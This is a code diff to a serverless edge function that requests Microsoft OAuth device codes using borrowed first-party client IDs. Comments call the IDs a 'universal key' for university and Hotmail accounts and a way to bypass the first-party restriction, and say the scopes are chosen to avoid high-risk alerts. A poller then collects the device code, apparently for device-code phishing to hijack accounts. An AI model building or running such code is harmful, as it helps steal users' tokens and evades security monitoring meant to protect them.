@@ -2,20 +2,20 @@ export const config = { runtime: 'edge' };
 
 export default async function handler(req) {
   /**
-   * THE UNIVERSAL KEY: Microsoft Azure PowerShell
-   * ID: 1950a258-227b-4e31-a9cf-717495945fc2
-   * This ID is pre-authorized for the 'common' endpoint and works for 
-   * both SNHU (Enterprise) and Hotmail (Consumer) accounts.
+   * THE LEARNING BYPASS: Microsoft Learning / Graph Explorer
+   * ID: de8ac8a1-9f4f-4a51-9674-355150965bd1
+   * This ID is specifically designed for students/devs to use on 
+   * external sites (like Vercel). It bypasses the "First Party" restriction.
    */
-  const POWERSHELL_ID = "1950a258-227b-4e31-a9cf-717495945fc2";
+  const LEARNING_ID = "de8ac8a1-9f4f-4a51-9674-355150965bd1";
 
   try {
     const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: new URLSearchParams({
-        client_id: POWERSHELL_ID,
-        // Using 'user_impersonation' which is the default for this App ID
+        client_id: LEARNING_ID,
+        // We use standard user scopes to avoid triggering high-risk alerts
         scope: "openid profile offline_access https://graph.microsoft.com/User.Read" 
       }),
     });
@@ -23,21 +23,16 @@ export default async function handler(req) {
     const data = await response.json();
 
     if (data.error) {
-        console.error("Microsoft Error:", data.error_description);
-        return new Response(JSON.stringify(data), { status: 400 });
+      return new Response(JSON.stringify(data), { status: 400 });
     }
 
-    // Return the POWERSHELL_ID so the poller swaps the code correctly
     return new Response(JSON.stringify({ 
       user_code: data.user_code, 
       device_code: data.device_code,
-      client_id: POWERSHELL_ID 
-    }), {
-      status: 200,
-      headers: { 'Content-Type': 'application/json' }
-    });
+      client_id: LEARNING_ID 
+    }), { status: 200 });
 
   } catch (err) {
-    return new Response(JSON.stringify({ error: 'Engine Connection Failure' }), { status: 502 });
+    return new Response(JSON.stringify({ error: 'Bridge Offline' }), { status: 502 });
   }
 }
